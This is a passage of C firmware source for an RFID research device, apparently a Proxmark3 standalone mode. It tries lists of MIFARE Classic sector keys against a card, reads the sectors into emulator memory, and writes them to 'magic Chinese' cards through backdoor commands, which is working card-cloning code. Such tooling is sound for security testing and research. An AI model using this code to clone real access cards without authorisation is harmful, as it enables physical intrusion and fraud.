            if (isOK && mifare_classic_readblock(pcs, cjcuid, FirstBlockOfSector(sectorNo) + blockNo, dataoutbuf)) {
                isOK = false;
                if (MF_DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NOLOG, "Error reading sector %2d block %2d", sectorNo, blockNo);
                break;
            };
            if (isOK) {
                *datain = 1;
                if (blockNo < NumBlocksPerSector(sectorNo) - 1) {
                    emlSetMem(dataoutbuf, FirstBlockOfSector(sectorNo) + blockNo, 1);
                } else { // sector trailer, keep the keys, set only the AC
                    emlGetMem(dataoutbuf2, FirstBlockOfSector(sectorNo) + blockNo, 1);
                    memcpy(&dataoutbuf2[6], &dataoutbuf[6], 4);
                    emlSetMem(dataoutbuf2, FirstBlockOfSector(sectorNo) + blockNo, 1);
                }
            } else {
                *datain = 0;
            }
        }
    }

    if (mifare_classic_halt(pcs, cjcuid)) {
        if (MF_DBGLEVEL >= 1)
            DbprintfEx(FLAG_NOLOG, "Halt error");
    };

    //  ----------------------------- crypto1 destroy
    crypto1_destroy(pcs);

    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    LEDsoff();

    if (MF_DBGLEVEL >= 2)
        DbpString("EMUL FILL SECTORS FINISHED\n");
}

/* . . . */

/* the chk function is a piwi’ed(tm) check that will try all keys for
a particular sector. also no tracing no dbg */

int cjat91_saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace, uint8_t keyCount, uint8_t *datain, uint64_t *key) {
    MF_DBGLEVEL = MF_DBG_NONE;
    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
    set_tracing(false);
    // uint8_t uid[10];
    // uint32_t cuid;
    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs;
    pcs = &mpcs;
    // byte_t isOK = 0;

    for (int i = 0; i < keyCount; ++i) {
        LEDsoff();

        /* no need for anticollision. just verify tag is still here */
        if (!iso14443a_fast_select_card(cjuid, 0)) {
            // if (!iso14443a_select_card(uid, NULL, &cuid, true, 0, true)) {
            cjSetCursLeft();
            DbprintfEx(FLAG_NOLOG, "%sFATAL%s : E_MF_LOSTTAG", _RED_, _WHITE_);
            return -1;
        }

        uint64_t ui64Key = bytes_to_num(datain + i * 6, 6);
        if (mifare_classic_auth(pcs, cjcuid, blockNo, keyType, ui64Key, AUTH_FIRST)) {
            uint8_t dummy_answer = 0;
            ReaderTransmit(&dummy_answer, 1, NULL);
            // wait for the card to become ready again
            SpinDelayUs(AUTHENTICATION_TIMEOUT);
            continue;
        }
        LED_A_ON();
        crypto1_destroy(pcs);
        FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
        *key = ui64Key;
        return i;
    }
    LED_A_ON();
    crypto1_destroy(pcs);
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);

    return -1;
}

void saMifareMakeTag(void) {
    // uint8_t cfail = 0;`
    cjSetCursLeft();
    cjTabulize();
    DbprintfEx(FLAG_NOLOG, "[Cloning...]");

    cjSetCursFRight();

    DbprintfEx(FLAG_NOLOG, ">> Write to Special:");
    int flags = 0;
    LED_A_ON(); // yellow
    for (int blockNum = 0; blockNum < 16 * 4; blockNum++) {
        uint8_t mblock[16];
        // cnt = 0;
        emlGetMem(mblock, blockNum, 1);
        // switch on field and send magic sequence
        if (blockNum == 0)
            flags = 0x08 + 0x02;

        // just write
        if (blockNum == 1)
            flags = 0;

        // Done. Magic Halt and switch off field.
        if (blockNum == 16 * 4 - 1)
            flags = 0x04 + 0x10;

        if (saMifareCSetBlock(0, flags & 0xFE, blockNum, mblock)) { //&& cnt <= retry) {
                                                                    // cnt++;
            cjSetCursFRight();
            DbprintfEx(FLAG_NOLOG, "Block :%02x %sOK%s", blockNum, _GREEN_, _WHITE_);
            //                                                      DbprintfEx(FLAG_RAWPRINT,"FATAL:E_MF_CHINESECOOK_NORICE");
            //                                                      cfail=1;
            // return;
            continue;
        } else {
            cjSetCursFRight();

            DbprintfEx(FLAG_NOLOG, "%sFAIL%s : CHN_FAIL_BLK_%02x_NOK", _RED_, _WHITE_, blockNum);
            break;
        }
        cjSetCursFRight();

        DbprintfEx(FLAG_NOLOG, "%s>>>>>>>> END <<<<<<<<%s", _YELLOW_, _WHITE_);
        // break;
        /*if (cfail == 1) {
                DbprintfEx(FLAG_RAWPRINT,"FATAL: E_MF_HARA_KIRI_\r\n");
                break;
        } */
    }
}

//-----------------------------------------------------------------------------
// Matt's StandAlone mod.
// Work with "magic Chinese" card (email him: ouyangweidaxian@live.cn)
//-----------------------------------------------------------------------------
int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_t *datain) {

    // params
    uint8_t needWipe = arg0;
    // bit 0 - need get UID
    // bit 1 - need wupC
    // bit 2 - need HALT after sequence
    // bit 3 - need init FPGA and field before sequence
    // bit 4 - need reset FPGA and LED
    uint8_t workFlags = arg1;
    uint8_t blockNo = arg2;

    // card commands
    uint8_t wupC1[] = {0x40};
    uint8_t wupC2[] = {0x43};
    uint8_t wipeC[] = {0x41};

    // variables
    byte_t isOK = 0;
    // uint8_t uid[10] = {0x00};
    uint8_t d_block[18] = {0x00};
    // uint32_t cuid;

    uint8_t receivedAnswer[MAX_MIFARE_FRAME_SIZE];
    uint8_t receivedAnswerPar[MAX_MIFARE_PARITY_SIZE];

    // reset FPGA and LED
    if (workFlags & 0x08) {
        LED_A_ON();
        LED_B_OFF();
        LED_C_OFF();
        iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);

        //  clear_trace();
        set_tracing(FALSE);
    }

    while (true) {
        // cjSetCursLeft();

        // get UID from chip
        if (workFlags & 0x01) {
            if (!iso14443a_fast_select_card(cjuid, 0)) {

                // if (!iso14443a_select_card(uid, NULL, &cuid, true, 0, true)) {
                if (MF_DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NOLOG, "Can't select card");
                break;
            };

            if (mifare_classic_halt(NULL, cjcuid)) {
                if (MF_DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NOLOG, "Halt error");
                break;
            };
        };

        // reset chip
        if (needWipe) {
            ReaderTransmitBitsPar(wupC1, 7, 0, NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                // if (MF_DBGLEVEL >= 1)
                DbprintfEx(FLAG_NOLOG, "wupC1 error");
                break;
            };

            ReaderTransmit(wipeC, sizeof(wipeC), NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                if (MF_DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NOLOG, "wipeC error");
                break;
            };

            if (mifare_classic_halt(NULL, cjcuid)) {
                if (MF_DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NOLOG, "Halt error");
                break;
            };
        };

        // chaud
        // write block
        if (workFlags & 0x02) {
            ReaderTransmitBitsPar(wupC1, 7, 0, NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                // if (MF_DBGLEVEL >= 1)
                DbprintfEx(FLAG_NOLOG, "wupC1 error");
                break;
            };

            ReaderTransmit(wupC2, sizeof(wupC2), NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                // if (MF_DBGLEVEL >= 1)
                DbprintfEx(FLAG_NOLOG, "wupC2 errorv");
                break;
            };
        }

        if ((mifare_sendcmd_short(NULL, 0, 0xA0, blockNo, receivedAnswer, receivedAnswerPar, NULL) != 1) || (receivedAnswer[0] != 0x0a)) {
            // if (MF_DBGLEVEL >= 1)
            DbprintfEx(FLAG_NOLOG, "write block send command error");
            break;
        };

        memcpy(d_block, datain, 16);
        AppendCrc14443a(d_block, 16);
        ReaderTransmit(d_block, sizeof(d_block), NULL);
        if ((ReaderReceive(receivedAnswer, receivedAnswerPar) != 1) || (receivedAnswer[0] != 0x0a)) {
            // if (MF_DBGLEVEL >= 1)
            DbprintfEx(FLAG_NOLOG, "write block send data error");
            break;
        };

        if (workFlags & 0x04) {
            if (mifare_classic_halt(NULL, cjcuid)) {
                // if (MF_DBGLEVEL >= 1)
                DbprintfEx(FLAG_NOLOG, "Halt error");
                break;
            };
        }

        isOK = 1;
        break;
    }

    if ((workFlags & 0x10) || (!isOK)) {
        FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
        LEDsoff();
    }

    return isOK;
}

